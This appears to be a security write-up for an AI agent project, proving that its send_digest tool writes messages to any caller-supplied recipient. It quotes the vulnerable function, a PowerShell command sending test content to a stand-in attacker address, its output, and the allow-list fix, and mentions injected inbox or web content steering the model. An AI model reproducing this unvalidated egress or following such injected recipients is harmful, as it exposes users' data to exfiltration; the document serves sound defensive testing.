# Manual exploit of vuln B — send_digest: uncontrolled egress, no fixed recipient

Companion to `attacks/MANUAL_VULN_A.md`, `_H.md`, `_E.md`, `_C.md`, same shape: this proves
a structural code-level claim about WITI's outbound-send tool by calling it directly, with
no LLM involved at all.

- **B-1 (`send_digest`) exfiltrates** — the function accepts a caller-supplied `recipient`
  with no validation against a fixed/allow-listed address, so any string sails through as
  a "delivered" send. Whether a model can be *talked into* passing an attacker's address in
  the first place (via inbox content, fetched pages, etc.) is a separate, behavioral
  question — this proof isolates the code-level fact that nothing downstream of that
  decision would catch or block it.

One root cause, same shape as C: this function executes a caller's send instruction with
no validation of who the recipient is.

**This proof mutates a real file (`outbox.txt`).** Snapshot before, restore after — see the
command sequence below. Do this in order; do not skip the snapshot step.

---

## B-1 — `send_digest`: no fixed recipient, no egress filter

### Vulnerable code (v1)

Frozen here verbatim, as it stood before hardening (see git history):

```python
# Weakness: recipient, subject, and body are all fully caller-controlled -- there is no
# fixed/allow-listed recipient in config, no egress filter, and no check that `recipient`
# matches the account owner. Whatever address is passed in is treated as a valid send
# target and written straight to the outbox.
def send_digest(recipient: str, subject: str, body: str) -> str:
    timestamp = datetime.datetime.now(datetime.timezone.utc).isoformat()
    with open(OUTBOX_PATH, "a", encoding="utf-8") as f:
        f.write(f"=== {timestamp} ===\nTo: {recipient}\nSubject: {subject}\n\n{body}\n\n")
    return f"Digest written to {OUTBOX_PATH} (to: {recipient})."
```

### Command (placeholder — see full ordered sequence below)

```powershell
& ".venv\Scripts\python.exe" -c "import main; print(main.send_digest('attacker@evil-exfil.example', 'INJECTED-TEST-SUBJECT', 'INJECTED-TEST-BODY: proves send_digest accepts any caller-supplied recipient')); print(open('outbox.txt', encoding='utf-8').read())"
```

### Result (actual output)

```
Digest written to outbox.txt (to: attacker@evil-exfil.example).
=== 2026-07-29T12:15:57.368072+00:00 ===
To: attacker@evil-exfil.example
Subject: INJECTED-TEST-SUBJECT

INJECTED-TEST-BODY: proves send_digest accepts any caller-supplied recipient
```

---

## What this proves

**B-1, egress control:** `send_digest` (`main.py:171-175`) performs zero validation on
`recipient` — no fixed/allow-listed address in config, no comparison against the account
owner's own address, no egress filter of any kind. Whatever string is passed as `recipient`
is written straight into the outbox entry as the delivery target and the function reports
success. This is a property of the function itself, demonstrable here with no model in the
loop — whether a model can be *talked into* calling `send_digest` with an attacker-supplied
recipient (e.g. via an injected instruction in inbox content or a fetched page) is a
separate, behavioral question this proof doesn't depend on. The code-level fact is that
nothing between "caller supplies a recipient string" and "message logged as sent to that
recipient" would stop it, regardless of how that string was chosen.

## Vulnerable code (v1)

See the frozen code block above (`send_digest` under B-1) — pasted verbatim from `main.py`,
untouched by this exercise.

## Summary

**What I built:** a minimal, LLM-free proof against the real, unmodified `send_digest()`
function, run against a snapshotted copy of the real outbox file so the demonstration is
reversible. **The issue:** the function doesn't validate who `recipient` is — no fixed
address, no allow-list, no owner check — so vuln B's uncontrolled-egress claim is
demonstrable from the code alone, with no model involved. **The fix (applied — v2):**
`send_digest`'s recipient is now checked against a config-defined allow-list
(`tool_policy.json`, resolved from `$OWNER_EMAIL`) at two independent enforcement
points, and a mismatch denies the send rather than delivering it.

---

## Running this proof: exact ordered command sequence

**Do these in order. Do not skip step 1. Do not run step 3 until after you've taken your
screenshot(s) in step 2.**

### Step 1 — SNAPSHOT (before anything else)

```powershell
Copy-Item outbox.txt outbox.txt.bak -Force
```

Run from the project root. This `.bak` file is already `.gitignore`d, so this is safe to
run repeatedly — it just overwrites your existing local recovery copy with a fresh
pre-proof snapshot.

### Step 2 — PROOF (mutates the real file — screenshot before moving to step 3)

B-1, `send_digest` with an attacker-style recipient, then read the outbox back:
```powershell
& ".venv\Scripts\python.exe" -c "import main; print(main.send_digest('attacker@evil-exfil.example', 'INJECTED-TEST-SUBJECT', 'INJECTED-TEST-BODY: proves send_digest accepts any caller-supplied recipient'))"
Get-Content outbox.txt
```

**What a correct result looks like:**
- B-1: `send_digest`'s return value confirms the write and echoes back
  `(to: attacker@evil-exfil.example)`, and `Get-Content outbox.txt` then shows a new entry
  at the end of the file addressed to `attacker@evil-exfil.example`, with the
  `INJECTED-TEST-SUBJECT` subject and `INJECTED-TEST-BODY` content intact — appearing
  structurally identical to a legitimate digest entry, with nothing marking it as
  suspicious, test data, or an unauthorized recipient.

**Screenshot guidance:** one screenshot showing the terminal with both commands and the
`outbox.txt` output, with the attacker-addressed entry visible at the end. **Take the
screenshot now, before step 3** — step 3 restores the file, so anything not captured yet
will be gone.

### Step 3 — RESTORE (after you've captured your screenshot)

```powershell
Copy-Item outbox.txt.bak outbox.txt -Force
```

Confirm the restore worked:
```powershell
Get-Content outbox.txt
```
`outbox.txt` should no longer contain the entry addressed to `attacker@evil-exfil.example`.

## v2: patched

`send_digest`'s `recipient` is now checked against a config-defined allow-list
(`tool_policy.json`'s `send_digest.args.recipient`, resolved from `$OWNER_EMAIL`) at
two independent enforcement points: `check_policy` before `run_tool` dispatches, and
a second in-function guard for a direct call that bypasses `run_tool`. A mismatch
denies rather than sends. The denial text itself was later found to leak that
allow-list back to the caller — see `attacks/MANUAL_VULN_B2_verbose_denial.md`.

Verify:
```
python attacks/verify_ab_patch.py
python attacks/verify_generic_denials.py
```
Expected: all PASS (4/4, 9/9), exit 0.

Live run: `attacks/LIVE_V2_RESULTS.md`, web run 3 — `send_digest` was approved to
the real owner only; the attacker address was never used as a recipient.
